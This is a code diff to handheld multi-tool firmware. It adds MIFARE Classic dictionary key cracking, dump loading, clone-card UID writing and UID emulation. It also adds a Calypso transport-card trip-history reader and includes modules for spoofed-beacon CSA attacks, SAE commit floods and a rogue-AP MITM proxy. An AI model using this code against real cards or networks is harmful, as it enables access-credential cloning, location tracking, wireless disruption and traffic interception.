+        // ENTER = skip this sector, BACK = abort all.
+        bool auth_ok = false, skip_sector = false, abort_all = false;
+        int hit_idx = -1;
+        g_nfc_fast = true;                 // short RF delays: card is already in the field
+        // Phase 1: retry the keys we've already found
+        for (int fi = 0; fi < n_found && !auth_ok; fi++) {
+            M5.update(); cardUpdate();
+            if (kp(KEY_BACKSPACE)) { keyRelease(); abort_all = true; break; }
+            if (kp(KEY_ENTER))     { keyRelease(); skip_sector = true; break; }
+            auth_ok = nfc_mifare_auth_crypto1(recard, first_block, MF_KEYS[found[fi]]);
+            if (auth_ok) hit_idx = found[fi];
+            else { recard = nfc_activate(); if (!recard.valid) break; }
+        }
+        // Phase 2: full dictionary sweep (only if the known keys missed)
+        for (int ki = 0; ki < MF_KEY_COUNT && !auth_ok && !skip_sector && !abort_all; ki++) {
+            M5.update(); cardUpdate();
+            if (kp(KEY_BACKSPACE)) { keyRelease(); abort_all = true; break; }
+            if (kp(KEY_ENTER))     { keyRelease(); skip_sector = true; break; }
+            if ((ki & 0x0F) == 0) {                                   // refresh try-progress every 16 keys
+                int kb = (int)((long)ki * (W - 20) / (MF_KEY_COUNT > 0 ? MF_KEY_COUNT : 1));
+                sp.fillRect(10, 56, W - 20, 6, 0x2104);
+                sp.fillRect(10, 56, kb, 6, TFT_YELLOW);
+                sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(10, 66);
+                sp.printf("try key %d/%d  ", ki, MF_KEY_COUNT);
+                sp.fillRect(0, H-14, W, 14, 0x0841);
+                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("ENTER=skip  BACK=abort");
+                if (use_sprite) sprite->pushSprite(0, 0);
             }
+            auth_ok = nfc_mifare_auth_crypto1(recard, first_block, MF_KEYS[ki]);
+            if (auth_ok) hit_idx = ki;
+            else { recard = nfc_activate(); if (!recard.valid) break; }
+        }
+        g_nfc_fast = false;
+        if (auth_ok && hit_idx >= 0) {        // remember this key for the next sectors
+            bool dup = false; for (int i = 0; i < n_found; i++) if (found[i] == hit_idx) { dup = true; break; }
+            if (!dup && n_found < 24) found[n_found++] = hit_idx;
+            Serial.printf("[MF] Sector %d: auth OK key #%d\n", sector, hit_idx);
         }
 
+        if (abort_all) { Serial.println("[MF] read aborted by user"); break; }
         if (!auth_ok) {
-            Serial.printf("[MF] Sector %d: all keys failed\n", sector);
+            Serial.printf("[MF] Sector %d: %s\n", sector, skip_sector ? "skipped" : "all keys failed");
             continue;
         }
 
@@ -49169,6 +50070,107 @@ int nfc_parse_dump(const char* path, uint8_t blocks[][16], int max_blocks, uint8
     return count;
 }
 
+// True if a 16-byte block 0 actually carries a UID (first 4 bytes not all-zero).
+// nfc_parse_dump zero-fills missing blocks, so a dump without a real "Block 0:"
+// line leaves block 0 all-zero; writing that as-is zeroes the target card's UID.
+bool nfc_blk0_has_uid(const uint8_t* b) {
+    return (b[0] | b[1] | b[2] | b[3]) != 0;
+}
+
+// Rebuild a plausible MIFARE Classic block 0 from a UID: UID + BCC + SAK + ATQA.
+// Used when the saved dump has no valid block 0, so Write UID / Write Clone can
+// still program a correct UID instead of all-zeros.
+void nfc_build_block0(const uint8_t* uid, int uid_len, uint8_t* out16) {
+    memset(out16, 0, 16);
+    if (uid_len == 4) {
+        memcpy(out16, uid, 4);
+        out16[4] = uid[0] ^ uid[1] ^ uid[2] ^ uid[3];   // BCC
+        out16[5] = 0x08;                                // SAK (Classic 1K)
+        out16[6] = 0x04; out16[7] = 0x00;               // ATQA
+    } else if (uid_len == 7) {
+        memcpy(out16, uid, 7);
+        out16[7] = 0x08;                                // SAK
+        out16[8] = 0x44; out16[9] = 0x00;               // ATQA (double-size UID)
+    } else if (uid_len >= 4) {
+        memcpy(out16, uid, uid_len > 16 ? 16 : uid_len);
+    }
+}
+
+// Load a MIFARE Classic dump in ANY common format into blocks[][16].
+// Supports: Flipper .nfc / our .txt ("UID:" + "Block N:"), raw binary
+// (.bin/.dump/.mfd, 16-byte blocks), Proxmark .eml (one 32-hex block per line),
+// MIFARE Classic Tool .mct ("+Sector:" headers + hex/"--" block lines).
+// Returns block count (highest index+1); fills uid_out/uid_len_out from a "UID:"
+// line, else from block 0's first 4 bytes.
+int nfc_load_any_dump(const char* path, uint8_t blocks[][16], int max_blocks, uint8_t* uid_out, int* uid_len_out) {
+    if (uid_len_out) *uid_len_out = 0;
+    File f = SD.open(path, FILE_READ);
+    if (!f) return 0;
+    long sz = f.size();
+    auto ishex = [](char c){ return (c>='0'&&c<='9')||(c>='a'&&c<='f')||(c>='A'&&c<='F'); };
+    auto hb = [](const String& s, int p)->uint8_t { return (uint8_t)strtol(s.substring(p, p+2).c_str(), NULL, 16); };
+
+    // binary sniff: non-printable bytes in the first 64 => raw dump
+    bool looks_text = true;
+    int probe = sz < 64 ? (int)sz : 64;
+    for (int i = 0; i < probe; i++) { int c = f.read(); if (c < 0) break;
+        if (c!='\r'&&c!='\n'&&c!='\t'&&(c<0x20||c>0x7E)) { looks_text = false; break; } }
+    f.seek(0);
+    String ext = String(path); ext.toLowerCase();
+    bool ext_bin = ext.endsWith(".bin") || ext.endsWith(".dump") || ext.endsWith(".mfd");
+
+    if (!looks_text || (ext_bin && (sz % 16) == 0 && sz >= 64)) {
+        memset(blocks, 0, max_blocks * 16);
+        int nb = (int)(sz / 16); if (nb > max_blocks) nb = max_blocks;
+        for (int b = 0; b < nb; b++) f.read(blocks[b], 16);
+        f.close();
+        if (uid_out && nb > 0) { memcpy(uid_out, blocks[0], 4); if (uid_len_out) *uid_len_out = 4; }
+        Serial.printf("[MF] Loaded binary dump: %d blocks\n", nb);
+        return nb;
+    }
+
+    memset(blocks, 0, max_blocks * 16);
+    int count = 0, eml_idx = 0, mct_blk = -1;
+    while (f.available()) {
+        String line = f.readStringUntil('\n'); line.trim();
+        if (line.length() == 0) continue;
+        if (line.startsWith("UID:") && uid_out) {
+            String u = line.substring(4); u.trim(); int ul = 0, p = 0;
+            while (p + 1 < (int)u.length() && ul < 10) { while (p<(int)u.length()&&u[p]==' ') p++; if (p+1>=(int)u.length()) break; uid_out[ul++]=hb(u,p); p+=2; }
+            if (uid_len_out) *uid_len_out = ul;
+            continue;
+        }
+        if (line.startsWith("Block ")) {                 // Flipper .nfc / our .txt
+            int colon = line.indexOf(':'); if (colon < 0) continue;
+            int bn = line.substring(6, colon).toInt();
+            if (bn < 0 || bn >= max_blocks) continue;
+            String h = line.substring(colon+1); h.trim(); int bp=0,bi=0;
+            while (bp+1 < (int)h.length() && bi < 16) { while(bp<(int)h.length()&&h[bp]==' ')bp++; if(bp+1>=(int)h.length())break; blocks[bn][bi++]=hb(h,bp); bp+=2; }
+            if (bn >= count) count = bn + 1;
+            continue;
+        }
+        if (line.startsWith("+Sector")) {                // .mct sector header
+            int colon = line.indexOf(':'); int sec = colon>=0 ? line.substring(colon+1).toInt() : 0;
+            mct_blk = sec * 4; continue;
+        }
+        String h = line; h.replace(" ", "");
+        if (mct_blk >= 0) {                              // inside a .mct sector: each 32-char line is a block slot
+            if (h.length() >= 32) { int bn = mct_blk++;
+                bool ah = true; for (int i=0;i<32;i++) if (!ishex(h[i])) { ah=false; break; }
+                if (ah && bn>=0 && bn<max_blocks) { for (int i=0;i<16;i++) blocks[bn][i]=hb(h,i*2); if (bn>=count) count=bn+1; } }
+        } else if (h.length() >= 32) {                   // .eml: sequential hex blocks
+            bool ah = true; for (int i=0;i<32;i++) if (!ishex(h[i])) { ah=false; break; }
+            if (ah) { int bn = eml_idx++; if (bn < max_blocks) { for (int i=0;i<16;i++) blocks[bn][i]=hb(h,i*2); if (bn>=count) count=bn+1; } }
+        }
+    }
+    f.close();
+    if (uid_out && uid_len_out && *uid_len_out == 0 && count > 0 && nfc_blk0_has_uid(blocks[0])) {
+        memcpy(uid_out, blocks[0], 4); *uid_len_out = 4;
+    }
+    Serial.printf("[MF] Loaded text dump: %d blocks\n", count);
+    return count;
+}
+
 // ── NFC Ultralight/NTAG Read + NDEF Parse ──
 
 int nfc_ul_read_pages(uint8_t* buf, int max_pages) {
@@ -49254,6 +50256,8 @@ int nfc_ndef_encode_url(const char* url, uint8_t* out, int max_len) {
     else if (strncmp(url, "http://www.", 11) == 0) { prefix = 0x01; skip = 11; }
     else if (strncmp(url, "https://", 8) == 0) { prefix = 0x04; skip = 8; }
     else if (strncmp(url, "http://", 7) == 0) { prefix = 0x03; skip = 7; }
+    else if (strncmp(url, "tel:", 4) == 0) { prefix = 0x05; skip = 4; }
+    else if (strncmp(url, "mailto:", 7) == 0) { prefix = 0x06; skip = 7; }
     int text_len = strlen(url + skip);
     int payload_len = 1 + text_len;
     if (4 + payload_len > max_len) return 0;
@@ -49271,6 +50275,122 @@ int nfc_ndef_encode_text(const char* text, uint8_t* out, int max_len) {
     out[4] = 0x02; out[5] = 'e'; out[6] = 'n';
     memcpy(out + 7, text, text_len);
     return 4 + payload_len;
+}
+
+// WiFi Simple Config NDEF (MIME application/vnd.wfa.wsc) — Android/iOS "tap to join".
+// open network if pass is empty, else WPA2-PSK/AES.
+int nfc_ndef_encode_wifi(const char* ssid, const char* pass, uint8_t* out, int max_len) {
+    int sl = strlen(ssid), pl = pass ? strlen(pass) : 0;
+    bool open = (pl == 0);
+    uint8_t in[200]; int ic = 0;                              // inner credential attributes
+    in[ic++]=0x10; in[ic++]=0x26; in[ic++]=0x00; in[ic++]=0x01; in[ic++]=0x01;               // Network Index = 1
+    in[ic++]=0x10; in[ic++]=0x45; in[ic++]=(sl>>8)&0xff; in[ic++]=sl&0xff; memcpy(in+ic,ssid,sl); ic+=sl;  // SSID
+    in[ic++]=0x10; in[ic++]=0x03; in[ic++]=0x00; in[ic++]=0x02; in[ic++]=0x00; in[ic++]=open?0x01:0x20;     // Auth: open/WPA2PSK
+    in[ic++]=0x10; in[ic++]=0x0F; in[ic++]=0x00; in[ic++]=0x02; in[ic++]=0x00; in[ic++]=open?0x01:0x08;     // Enc: none/AES
+    in[ic++]=0x10; in[ic++]=0x27; in[ic++]=(pl>>8)&0xff; in[ic++]=pl&0xff; if(pl){memcpy(in+ic,pass,pl); ic+=pl;}  // Network Key
+    in[ic++]=0x10; in[ic++]=0x20; in[ic++]=0x00; in[ic++]=0x06; memset(in+ic,0,6); ic+=6;    // MAC (zeros)
+    uint8_t pay[220]; int pc=0;                               // wrap in Credential (0x100E)
+    pay[pc++]=0x10; pay[pc++]=0x0E; pay[pc++]=(ic>>8)&0xff; pay[pc++]=ic&0xff; memcpy(pay+pc,in,ic); pc+=ic;
+    const char* mime="application/vnd.wfa.wsc"; int tl=strlen(mime);
+    if (pc > 255 || 3+tl+pc > max_len) return 0;
+    int o=0; out[o++]=0xD2; out[o++]=(uint8_t)tl; out[o++]=(uint8_t)pc;   // MB|ME|SR, TNF=2 (MIME)
+    memcpy(out+o,mime,tl); o+=tl; memcpy(out+o,pay,pc); o+=pc;
+    return o;
+}
+
+// vCard contact NDEF (MIME text/vcard)
+int nfc_ndef_encode_vcard(const char* name, const char* phone, uint8_t* out, int max_len) {
+    char vc[220];
+    int n = snprintf(vc, sizeof vc, "BEGIN:VCARD\r\nVERSION:3.0\r\nN:%s\r\nFN:%s\r\nTEL:%s\r\nEND:VCARD\r\n", name, name, phone);
+    const char* mime="text/vcard"; int tl=strlen(mime);
+    if (n<=0 || n>255 || 3+tl+n > max_len) return 0;
+    int o=0; out[o++]=0xD2; out[o++]=(uint8_t)tl; out[o++]=(uint8_t)n;
+    memcpy(out+o,mime,tl); o+=tl; memcpy(out+o,vc,n); o+=n;
+    return o;
+}
+
+// Android Application Record (external type android.com:pkg) — launches/opens an app
+int nfc_ndef_encode_aar(const char* pkg, uint8_t* out, int max_len) {
+    const char* typ="android.com:pkg"; int tl=strlen(typ); int pl=strlen(pkg);
+    if (pl>255 || 3+tl+pl > max_len) return 0;
+    int o=0; out[o++]=0xD4; out[o++]=(uint8_t)tl; out[o++]=(uint8_t)pl;   // MB|ME|SR, TNF=4 (external)
+    memcpy(out+o,typ,tl); o+=tl; memcpy(out+o,pkg,pl); o+=pl;
+    return o;
+}
+
+// NTAG capacity via GET_VERSION (0x60). Returns user bytes; *last_page = highest writable page.
+int nfc_ntag_capacity(int* last_page) {
+    uint8_t cmd[1] = {0x60};
+    int rx; uint8_t* r = nfc_transceive(cmd, 1, &rx, 100);
+    if (r && rx >= 8 && r[1] == 0x04) {                 // NXP vendor
+        switch (r[6]) {                                 // storage size byte
+            case 0x0F: if(last_page)*last_page=39;  return 144;  // NTAG213
+            case 0x11: if(last_page)*last_page=129; return 504;  // NTAG215
+            case 0x13: if(last_page)*last_page=225; return 888;  // NTAG216
+        }
+    }
+    if (last_page) *last_page = 15;                     // plain Ultralight fallback (user pages 4-15)
+    return 48;
+}
+
+// Robust NDEF write: CC sized to the tag, then page-by-page WRITE + read-back verify,
+// with a progress bar. Returns false on capacity overflow or a page that won't verify.
+bool nfc_write_ndef_verified(const uint8_t* tlv, int tlv_len, int last_page,
+                             LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
+    const int W = 240;
+    uint8_t cc[4] = {0xE1, 0x10, 0x06, 0x00};
+    if (last_page >= 4) cc[2] = (uint8_t)(((last_page - 3) * 4) / 8);   // size/8
+    if (!nfc_ul_write_page(3, cc)) { Serial.println("[NDEF] CC write failed"); return false; }
+    int pages = (tlv_len + 3) / 4;
+    for (int i = 0; i < pages; i++) {
+        int page = 4 + i;
+        if (page > last_page) { Serial.printf("[NDEF] data exceeds tag capacity at page %d\n", page); return false; }
+        uint8_t pd[4] = {0,0,0,0}; int rem = tlv_len - i * 4; memcpy(pd, tlv + i * 4, min(4, rem));
+        bool ok = false;
+        for (int t = 0; t < 3 && !ok; t++) {
+            if (nfc_ul_write_page(page, pd)) {
+                uint8_t rc[2] = {0x30, (uint8_t)page}; int rx;      // READ 0x30 returns 16 B (4 pages)
+                uint8_t* r = nfc_transceive(rc, 2, &rx, 100);
+                if (r && rx >= 4 && memcmp(r, pd, 4) == 0) ok = true;
+            }
+        }
+        if (!ok) { Serial.printf("[NDEF] page %d write/verify failed\n", page); return false; }
+        if ((i & 0x03) == 0 || i == pages - 1) {
+            sp.fillRect(10, 70, W - 20, 8, 0x2104);
+            sp.fillRect(10, 70, (i + 1) * (W - 20) / pages, 8, TFT_GREEN);
+            sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(10, 82); sp.printf("page %d/%d  ", i + 1, pages);
+            if (use_sprite) sprite->pushSprite(0, 0);
+        }
+    }
+    Serial.printf("[NDEF] written + verified: %d pages\n", pages);
+    return true;
+}
+
+// Reusable on-screen keyboard text input. Returns true on ENTER, false on BACK-at-empty.
+bool ndef_kbd_input(const char* prompt, char* buf, int maxlen, bool mask,
+                    LovyanGFX& sp, bool use_sprite, M5Canvas* sprite, const char* preset) {
+    const int W = 240, H = 135;
+    int pos = 0; buf[0] = 0;
+    if (preset) { strncpy(buf, preset, maxlen - 1); pos = strlen(buf); }
+    enterDebounce();
+    while (true) {
+        sp.fillScreen(TFT_BLACK);
+        sp.fillRect(0, 0, W, 14, 0x0841);
+        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print(prompt);
+        sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 20);
+        for (int i = 0; i < pos; i++) sp.print(mask ? '*' : buf[i]);
+        sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.print("_");
+        sp.fillRect(0, H-14, W, 14, 0x0841);
+        sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.printf("ENTER=ok  DEL=back  len:%d", pos);
+        if (use_sprite) sprite->pushSprite(0, 0);
+        M5.update(); cardUpdate();
+        if (kp(KEY_ENTER)) { keyRelease(); return pos > 0; }
+        if (kp(KEY_BACKSPACE)) { keyRelease(); if (pos > 0) { buf[--pos] = 0; continue; } return false; }
+        for (char c = ' '; c <= '~'; c++) {
+            if (kp(c) && pos < maxlen - 1) { buf[pos++] = c; buf[pos] = 0; keyRelease(); break; }
+        }
+        delay(20);
+    }
 }
 
 int nfc_ndef_wrap_tlv(const uint8_t* record, int rec_len, uint8_t* out, int max_len) {
@@ -49314,7 +50434,14 @@ bool nfc_write_ndef(const uint8_t* ndef_tlv, int tlv_len) {
 
 bool nfc_emulate_uid(const uint8_t* uid, int uid_len, uint16_t atqa, uint8_t sak, int timeout_s) {
     if (!nfc_opened) return false;
-    nfc_setup_target_mode(uid, uid_len, atqa, sak);
+    // Use the fuller target-mode setup (STOP_ALL before PTA load + IRQ masks
+    // cleared) so the HW auto-anticollision returns a clean SAK and the reader
+    // (e.g. Flipper) classifies it as MIFARE Classic, not "ISO14443-3A unknown".
+    nfc_emul_start(uid, uid_len, atqa, sak);
+
+    Serial.printf("[EMU] present UID");
+    for (int i = 0; i < uid_len; i++) Serial.printf(" %02X", uid[i]);
+    Serial.printf("  ATQA %04X  SAK %02X\n", atqa, sak);
 
     unsigned long deadline = millis() + (unsigned long)timeout_s * 1000;
     unsigned long detect_count = 0;
@@ -49322,17 +50449,21 @@ bool nfc_emulate_uid(const uint8_t* uid, int uid_len, uint16_t atqa, uint8_t sak
         M5.update(); cardUpdate();
         if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
 
-        uint8_t tgt_irq = nfc_rr(NFC_IRQ_TGT);
-        uint8_t main_irq = nfc_rr(NFC_IRQ_MAIN);
-
-        if (tgt_irq & 0x08) detect_count++;
-        if (main_irq & 0x01) {
-            nfc_rr(0x1A); nfc_rr(0x1B); nfc_rr(NFC_IRQ_ERR); nfc_rr(NFC_IRQ_TGT);
-            uint8_t pt2 = nfc_rr(NFC_PASS_TGT);
-            nfc_wr(NFC_PASS_TGT, pt2 & ~0x01);
+        // Capture + log the higher-layer commands the reader sends after the HW
+        // auto-handles anticollision/SELECT (0x50=HLTA, 0x60/0x61=AUTH, 0x30=READ,
+        // 0xE0=RATS...). Shows whether the reader classified us as MIFARE Classic.
+        uint8_t frame[64]; uint8_t tgt = 0;
+        int n = nfc_emul_poll(frame, sizeof frame, 50, &tgt);
+        if (n > 0) {
+            detect_count++;
+            Serial.printf("[EMU] rx(%d):", n);
+            for (int i = 0; i < n; i++) Serial.printf(" %02X", frame[i]);
+            Serial.println();
+            nfc_cmd(NFC_CMD_GOTO_SENSE);            // re-arm for the next command
+        } else if (tgt & 0x08) {
+            detect_count++;                          // field/select seen, no payload frame
             nfc_cmd(NFC_CMD_GOTO_SENSE);
         }
-        delay(5);
     }
 
     nfc_cmd(NFC_CMD_STOP_ALL);
@@ -50029,6 +51160,14 @@ void nfc_mfemul_ui() {
 #include "src/nfc_flipper_fmt.h"
 #include "src/nfc_flipper_dev.h"
 #include "src/nfc_amiibo.h"   // Amiibo (NTAG215) emulate + clone
+#include "src/nfc_calypso.h"  // Calypso/Intercode transport card reader (ISO-B, read-only)
+#include "src/chameleon_ble.h" // ChameleonUltra BLE client (Bluedroid central, serial console)
+#include "src/nfc_st25tb.h"    // ST25TB/SRI/SRIX Type-B' reader+writer (dump/save/write/restore)
+#include "src/ir_remote.h"     // IR remote: 38kHz TX on GPIO44 (NEC/Samsung/SIRC/RC5/raw/.ir/power/dazzler)
+#include "src/drone_detect.h"  // Drone RemoteID (OpenDroneID/ASTM F3411) passive detect: WiFi + BLE
+#include "src/wifi_csa.h"      // CSA (Channel Switch Announcement) spoofed-beacon attack
+#include "src/wifi_sae.h"      // WPA3/SAE checker + SAE commit flood
+#include "src/mitm_proxy.h"    // MITM proxy: rogue AP + STA uplink + DNS/HTTP/TLS transparent relay
 #include "src/wifi_radar.h"   // DragonRadar port: passive 802.11 radar + BLE scan
 #include "src/smb_discover.h" // Auto SMB discovery + anonymous/guest browser (read-only)
 
@@ -50194,6 +51333,766 @@ void nfc_amiibo_ui() {
     }
 }
 
+// ── Calypso / Intercode transport-card reader UI (ISO-B, READ-ONLY) ─────────
+// Activates a Type-B Calypso card at layer 4 and reads the public Intercode
+// files (no key needed): chip id, country, contract count and the trip history
+// (date + time) from the validation journal. 's' saves a text report to
+// /evil/nfc/calypso/<pupi>.txt. Only SELECT / READ RECORD are ever issued;
+// nothing on the card is modified. Authorized use only.
+// Regular (non-static) sketch function: the auto-prototype "void
+// nfc_calypso_ui();" has no namespaced arg, and being part of the main TU it
+// avoids the l32r literal-pool overflow an inline header COMDAT would hit.
+void nfc_calypso_ui() {
+    M5Canvas cv(&M5.Display); cv.setColorDepth(8);
+    bool ok = cv.createSprite(240, 135);
+    LovyanGFX& d = ok ? (LovyanGFX&)cv : (LovyanGFX&)M5.Display;
+
+    calypso::CalypsoCard card;
+    keyRelease();
+    while (true) {
+        M5.update(); cardUpdate();
+        if (kp(KEY_BACKSPACE)) { keyRelease(); if (ok) cv.deleteSprite(); return; }
+        d.fillScreen(TFT_BLACK);
+        d.fillRect(0, 0, 240, 14, 0x0841);
+        d.setTextFont(1); d.setTextSize(1);
+        d.setTextColor(0xFC00, 0x0841); d.setCursor(2, 3); d.print("Calypso (ISO-B)");
+        d.setTextColor(TFT_WHITE, TFT_BLACK);
+        d.setCursor(6, 40); d.print("Present a Type-B");
+        d.setCursor(6, 54); d.print("Calypso transport card...");
+        d.setTextColor(0x5AEB, TFT_BLACK); d.setCursor(6, 120); d.print("BACK=exit");
+        if (ok) cv.pushSprite(0, 0);
+        if (calypso::caly_dump(card) && card.ok && card.app_present) break;
+        delay(150);
+    }
+
+    // Build one scrollable list of all decoded info: header, every trip (2 lines),
+    // every contract. Scroll with ;/. ; 's' saves the decoded report to SD.
+    std::vector<String> L;
+    char b[52];
+    snprintf(b, sizeof(b), "PUPI %02X%02X%02X%02X  %s", card.pupi[0], card.pupi[1], card.pupi[2], card.pupi[3], card.country == 0x0250 ? "FR" : ""); L.push_back(b);
+    if (card.env_ok) {
+        snprintf(b, sizeof(b), "Net %03lX %.16s", (unsigned long)(card.networkId & 0xFFF), calypso::caly_network(card.networkId)); L.push_back(b);
+        if (card.env_validEnd) { int Y, M, D; calypso::caly_days_to_date(card.env_validEnd, &Y, &M, &D); snprintf(b, sizeof(b), "valid until %04d-%02d-%02d", Y, M, D); L.push_back(b); }
+    } else { snprintf(b, sizeof(b), "Country %04X  FSCI %d", card.country, card.fsci); L.push_back(b); }
+    snprintf(b, sizeof(b), "2nd app: %s", card.app2_present ? "yes" : "no"); L.push_back(b);
+    snprintf(b, sizeof(b), "== Trips (%d) ==", card.ntrips); L.push_back(b);
+    for (int i = 0; i < card.ntrips; i++) {
+        const calypso::Trip& t = card.trips[i];
+        if (!t.valid) { L.push_back(" (empty)"); continue; }
+        int Y, M, D; calypso::caly_days_to_date(t.day, &Y, &M, &D);
+        snprintf(b, sizeof(b), " %04d-%02d-%02d %02d:%02d %s/%s", Y, M, D, t.minute / 60, t.minute % 60,
+                 t.has_ec ? calypso::caly_transport(t.ec >> 4) : "?", t.has_ec ? calypso::caly_transition(t.ec & 0xF) : "?"); L.push_back(b);
+        snprintf(b, sizeof(b), "   L%u s%u op%u c#%u", t.has_line ? t.line : 0, t.has_loc ? t.loc : 0, t.has_prov ? t.prov : 0, t.has_cptr ? t.cptr : 0); L.push_back(b);
+    }
+    snprintf(b, sizeof(b), "== Contracts (%d) ==", card.ncontract_rec); L.push_back(b);
+    for (int i = 0; i < card.ncontract_rec; i++) {
+        const calypso::Contract& ct = card.contracts[i];
+        int p = snprintf(b, sizeof(b), " #%d t%u %s", i + 1, ct.tariff, calypso::caly_cstatus(ct.status));
+        if (ct.endDate) { int Y, M, D; calypso::caly_days_to_date(ct.endDate, &Y, &M, &D); snprintf(b + p, sizeof(b) - p, " ->%04d-%02d-%02d", Y, M, D); }
+        L.push_back(b);
+    }
+    L.push_back("== Info ==");
+    if (card.startup_ok) { snprintf(b, sizeof(b), " %s v%02X.%02X", calypso::caly_apptype(card.startup[2]), card.startup[5], card.startup[6]); L.push_back(b); }
+    if (card.counter_ok) { snprintf(b, sizeof(b), " counter c#1: %lu", (unsigned long)card.counter_val); L.push_back(b); }
+    { snprintf(b, sizeof(b), " holder: %s", card.holder_ok ? "present" : "none (anon)"); L.push_back(b); }
+    if (card.nload) {
+        snprintf(b, sizeof(b), " load hist: %d rec", card.nload); L.push_back(b);
+        for (int i = 0; i < card.nload; i++) { char db[16];
+            if (card.load_len[i] >= 3 && calypso::caly_bcd_date(card.load_raw[i], db, sizeof(db))) snprintf(b, sizeof(b), "   #%d %s?", i + 1, db);
+            else snprintf(b, sizeof(b), "   #%d %02X%02X%02X..", i + 1, card.load_raw[i][0], card.load_raw[i][1], card.load_raw[i][2]);
+            L.push_back(b); }
+    }
+
+    int top = 0; const int vis = 6; bool saved = false; bool redraw = true;
+    int total = (int)L.size();
+    keyRelease();
+    while (true) {
+        M5.update(); cardUpdate();
+        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+        if (kp('.')) { keyRelease(); if (top < total - vis) { top++; redraw = true; } }
+        if (kp(';')) { keyRelease(); if (top > 0) { top--; redraw = true; } }
+        if (kp('s') || kp('S')) { keyRelease(); calypso::caly_write_report(card); saved = true; redraw = true; }
+        if (!redraw) { delay(30); continue; }
+        redraw = false;
+        d.fillScreen(TFT_BLACK);
+        d.fillRect(0, 0, 240, 14, 0x0841); d.setTextFont(1); d.setTextSize(1);
+        d.setTextColor(0xFC00, 0x0841); d.setCursor(2, 3); d.print("Calypso decoded");
+        d.setTextSize(1.5);   // bigger, readable content (was size 1)
+        int y = 18;
+        for (int i = top; i < total && i < top + vis; i++) {
+            const String& s = L[i];
+            if (s.startsWith("==")) d.setTextColor(TFT_YELLOW, TFT_BLACK);
+            else if (s.startsWith("Net") || s.startsWith("PUPI") || s.startsWith("valid") || s.startsWith("2nd") || s.startsWith("Country")) d.setTextColor(TFT_CYAN, TFT_BLACK);
+            else d.setTextColor(TFT_WHITE, TFT_BLACK);
+            d.setCursor(4, y); d.print(s); y += 16;
+        }
+        d.setTextSize(1);
+        d.fillRect(0, 121, 240, 14, 0x0841);
+        d.setTextColor(saved ? TFT_GREEN : 0x5AEB, 0x0841); d.setCursor(4, 123);
+        d.printf("%s ;/.=scroll s=SD BACK", saved ? "saved!" : "");
+        if (ok) cv.pushSprite(0, 0);
+        delay(20);
+    }
+    if (ok) cv.deleteSprite();
+}
+
+// ===========================================================================
+// ChameleonUltra BLE UI — main-menu item "Chameleon" (below Cap NFC).
+// Modern list UI with a live BLE status pill in the header. Actions map to the
+// chameleon:: client. Dumps will land in /evil/nfc (same as Cap NFC) in phase 2.
+// ===========================================================================
+void chameleonMenu() {
+    keyRelease();
+    const int W = 240, H = 135;
+    // Draw straight to the panel (NO off-screen sprite): Bluedroid BLE + this
+    // firmware leave very little free heap, and a 240x135x8bpp canvas (~32 KB)
+    // would starve BLE connect/discovery and crash (same reason as the BLE GATT
+    // Explorer). Minor flicker, memory-safe.
+    auto& sp = (LovyanGFX&)M5.Display;
+    auto flush = [&]() {};
+
+    // header with a live connection pill (green = linked, grey = no link)
+    auto header = [&](const char* title = "Chameleon") {
+        bool on = chameleon::cu_is_connected();
+        sp.fillRect(0, 0, W, 16, 0x0841);
+        sp.drawFastHLine(0, 16, W, 0xFC00);
+        sp.setTextFont(1); sp.setTextSize(1.5);
+        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(6, 2); sp.print(title);
+        sp.setTextSize(1);
+        uint16_t c = on ? TFT_GREEN : 0x8410;
+        sp.fillCircle(W - 74, 8, 4, c);
+        sp.setTextColor(c, 0x0841); sp.setCursor(W - 64, 4); sp.print(on ? "BLE link" : "no link");
+    };
+    auto footer = [&](const char* s) {
+        sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextSize(1);
+        sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print(s);
+    };
+    auto msg = [&](const char* l1, uint16_t c1, const char* l2) {
+        sp.fillScreen(TFT_BLACK); header(); sp.setTextSize(1.5);
+        sp.setTextColor(c1, TFT_BLACK); sp.setCursor(8, 44); sp.print(l1);
+        if (l2) { sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(8, 64); sp.print(l2); }
+        footer("BACK=menu"); flush();
+    };
+    auto wait_key = [&]() {
+        while (true) { M5.update(); cardUpdate(); if (kp(KEY_BACKSPACE) || kp(KEY_ENTER)) { keyRelease(); return; } delay(10); }
+    };
+    // scrollable multi-line result page
+    auto show_lines = [&](std::vector<String>& L) {
+        int top = 0; const int vis = 6; bool rd = true;
+        while (true) {
+            if (rd) {
+                sp.fillScreen(TFT_BLACK); header(); sp.setTextSize(1.5);
+                for (int i = 0; i < vis && top + i < (int)L.size(); i++) {
+                    sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(6, 19 + i * 16); sp.print(L[top + i]);
+                }
+                footer(L.size() > (size_t)vis ? ";/. scroll  BACK" : "BACK=menu"); flush(); rd = false;
+            }
+            M5.update(); cardUpdate();
+            if (kp(KEY_BACKSPACE)) { keyRelease(); return; }
+            if (kp(';')) { if (top > 0) { top--; rd = true; } keyRelease(); delay(110); }
+            if (kp('.')) { if (top + vis < (int)L.size()) { top++; rd = true; } keyRelease(); delay(110); }
+            delay(10);
+        }
+    };
+
+    // action handlers -------------------------------------------------------
+    auto act_connect = [&]() {
+        if (chameleon::cu_is_connected()) {
+            chameleon::cu_disconnect(); msg("Disconnected.", TFT_ORANGE, nullptr); wait_key(); return;
+        }
+        msg("Connecting over BLE...", TFT_YELLOW, "keep Chameleon awake");
+        bool ok = chameleon::cu_connect(10);
+        if (ok) { msg("Connected + paired.", TFT_GREEN, nullptr); }
+        else if (!chameleon::cu_found) { msg("Chameleon not found.", TFT_RED, "wake it, BLE on"); }
